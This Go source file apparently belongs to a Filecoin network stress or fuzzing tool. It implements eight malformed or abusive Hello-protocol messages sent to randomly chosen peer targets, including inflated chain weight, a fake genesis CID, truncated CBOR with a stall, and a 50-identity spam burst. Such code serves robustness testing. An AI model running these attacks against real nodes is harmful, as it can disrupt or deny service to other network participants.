package main

import (
	"context"
	"log"
	"math"
	"sync"
	"time"

	"github.com/ipfs/go-cid"
	"github.com/libp2p/go-libp2p/core/host"
	"github.com/libp2p/go-libp2p/core/peer"
	"github.com/multiformats/go-multihash"
)

const helloProtocol = "/fil/hello/1.0.0"

// buildHelloMessage builds a Hello protocol message as CBOR.
// HelloMessage wire format: [HeaviestTipSet []CID, HeaviestTipSetHeight int64, HeaviestTipSetWeight BigInt-bytes, GenesisHash CID]
func buildHelloMessage(tipset []cid.Cid, height uint64, weight uint64, genesis cid.Cid) []byte {
	return cborArray(
		cborCIDArray(tipset),
		cborUint64(height),
		cborBytes(bigIntBytes(weight)),
		cborCID(genesis),
	)
}

// parseGenesisCID converts the genesis CID string discovered at startup to a cid.Cid.
func parseGenesisCID() cid.Cid {
	if genesisCID == "" {
		return randomCID()
	}
	c, err := cid.Decode(genesisCID)
	if err != nil {
		log.Printf("[hello] cannot parse genesis CID %q: %v, using random", genesisCID, err)
		return randomCID()
	}
	return c
}

// getAllHelloAttacks returns all 8 Hello protocol attack vectors.
func getAllHelloAttacks() []namedAttack {
	attacks := []struct {
		name string
		fn   func(context.Context, host.Host, peer.AddrInfo)
	}{
		{"hello-empty-tipset", helloEmptyTipSet},
		{"hello-huge-tipset", helloHugeTipSet},
		{"hello-inflated-weight", helloInflatedWeight},
		{"hello-future-height", helloFutureHeight},
		{"hello-immediate-disconnect", helloImmediateDisconnect},
		{"hello-partial-cbor", helloPartialCBOR},
		{"hello-wrong-genesis", helloWrongGenesis},
		{"hello-spam-50", helloSpam50},
	}

	result := make([]namedAttack, len(attacks))
	for i, a := range attacks {
		a := a
		result[i] = namedAttack{
			name: a.name,
			fn: func() {
				target := rngChoice(targets)
				h, err := pool.GetForStream(ctx)
				if err != nil {
					log.Printf("[%s] get host failed: %v", a.name, err)
					return
				}
				a.fn(ctx, h, target.AddrInfo)
			},
		}
	}
	return result
}

// --- Individual attack vectors ---

// H1: Empty TipSet array
func helloEmptyTipSet(ctx context.Context, h host.Host, target peer.AddrInfo) {
	s, err := openHelloStream(ctx, h, target)
	if err != nil {
		debugLog("[hello-empty-tipset] stream open failed: %v", err)
		return
	}
	defer s.Close()

	payload := buildHelloMessage(nil, 1, 100, parseGenesisCID())
	s.Write(payload)
	s.CloseWrite()
}

// H2: Huge TipSet (50 random CIDs)
func helloHugeTipSet(ctx context.Context, h host.Host, target peer.AddrInfo) {
	s, err := openHelloStream(ctx, h, target)
	if err != nil {
		debugLog("[hello-huge-tipset] stream open failed: %v", err)
		return
	}
	defer s.Close()

	cids := make([]cid.Cid, 50)
	for i := range cids {
		cids[i] = randomCID()
	}

	payload := buildHelloMessage(cids, 1, 100, parseGenesisCID())
	s.Write(payload)
	s.CloseWrite()
}

// H3: Inflated weight (MaxInt64) with correct genesis
func helloInflatedWeight(ctx context.Context, h host.Host, target peer.AddrInfo) {
	s, err := openHelloStream(ctx, h, target)
	if err != nil {
		debugLog("[hello-inflated-weight] stream open failed: %v", err)
		return
	}
	defer s.Close()

	payload := buildHelloMessage(
		[]cid.Cid{randomCID()},
		1,
		uint64(math.MaxInt64),
		parseGenesisCID(),
	)
	s.Write(payload)
	s.CloseWrite()
}

// H4: Future height (100000)
func helloFutureHeight(ctx context.Context, h host.Host, target peer.AddrInfo) {
	s, err := openHelloStream(ctx, h, target)
	if err != nil {
		debugLog("[hello-future-height] stream open failed: %v", err)
		return
	}
	defer s.Close()

	payload := buildHelloMessage([]cid.Cid{randomCID()}, 100000, 100, parseGenesisCID())
	s.Write(payload)
	s.CloseWrite()
}

// H5: Immediate disconnect - send Hello then reset stream
func helloImmediateDisconnect(ctx context.Context, h host.Host, target peer.AddrInfo) {
	s, err := openHelloStream(ctx, h, target)
	if err != nil {
		debugLog("[hello-immediate-disconnect] stream open failed: %v", err)
		return
	}

	payload := buildHelloMessage([]cid.Cid{randomCID()}, 1, 100, parseGenesisCID())
	s.Write(payload)
	s.Reset() // abrupt disconnect
}

// H6: Partial CBOR - first half of valid Hello, then hang 15s
func helloPartialCBOR(ctx context.Context, h host.Host, target peer.AddrInfo) {
	s, err := openHelloStream(ctx, h, target)
	if err != nil {
		debugLog("[hello-partial-cbor] stream open failed: %v", err)
		return
	}
	defer s.Close()

	valid := buildHelloMessage([]cid.Cid{randomCID()}, 1, 100, parseGenesisCID())
	s.Write(valid[:len(valid)/2])
	time.Sleep(15 * time.Second)
	s.CloseWrite()
}

// H7: Wrong genesis CID
func helloWrongGenesis(ctx context.Context, h host.Host, target peer.AddrInfo) {
	s, err := openHelloStream(ctx, h, target)
	if err != nil {
		debugLog("[hello-wrong-genesis] stream open failed: %v", err)
		return
	}
	defer s.Close()

	// Use a completely random CID as genesis (definitely wrong)
	fakeGenesis := randomCID()
	payload := buildHelloMessage([]cid.Cid{randomCID()}, 1, 100, fakeGenesis)
	s.Write(payload)
	s.CloseWrite()
}

// H8: Spam 50 - fresh identities sending Hello simultaneously
func helloSpam50(ctx context.Context, _ host.Host, target peer.AddrInfo) {
	var wg sync.WaitGroup

	for i := 0; i < 50; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()

			freshHost, err := pool.GetFresh(ctx)
			if err != nil {
				return
			}
			defer freshHost.Close()

			s, err := openHelloStream(ctx, freshHost, target)
			if err != nil {
				return
			}
			defer s.Close()

			payload := buildHelloMessage([]cid.Cid{randomCID()}, 1, 100, parseGenesisCID())
			s.Write(payload)
			s.CloseWrite()
		}()
	}

	wg.Wait()
}

// openHelloStream connects to the target and opens a Hello protocol stream.
func openHelloStream(ctx context.Context, h host.Host, target peer.AddrInfo) (*wrappedStream, error) {
	connectCtx, cancel := context.WithTimeout(ctx, 10*time.Second)
	defer cancel()

	if err := h.Connect(connectCtx, target); err != nil {
		return nil, err
	}

	streamCtx, streamCancel := context.WithTimeout(ctx, 10*time.Second)
	defer streamCancel()

	s, err := h.NewStream(streamCtx, target.ID, helloProtocol)
	if err != nil {
		return nil, err
	}
	return &wrappedStream{s}, nil
}

// wrappedStream wraps network.Stream to provide convenience methods.
type wrappedStream struct {
	s interface {
		Write([]byte) (int, error)
		Read([]byte) (int, error)
		Close() error
		CloseWrite() error
		Reset() error
	}
}

// compile-time check that wrappedStream is usable — we just need Write/Close/Reset.
var _ = (*wrappedStream)(nil)

func (w *wrappedStream) Write(b []byte) (int, error) { return w.s.Write(b) }
func (w *wrappedStream) Close() error                { return w.s.Close() }
func (w *wrappedStream) CloseWrite() error           { return w.s.CloseWrite() }
func (w *wrappedStream) Reset() error                { return w.s.Reset() }

// Ensure the multihash import is used (needed for randomCID in cbor_helpers.go).
var _ = multihash.SHA2_256
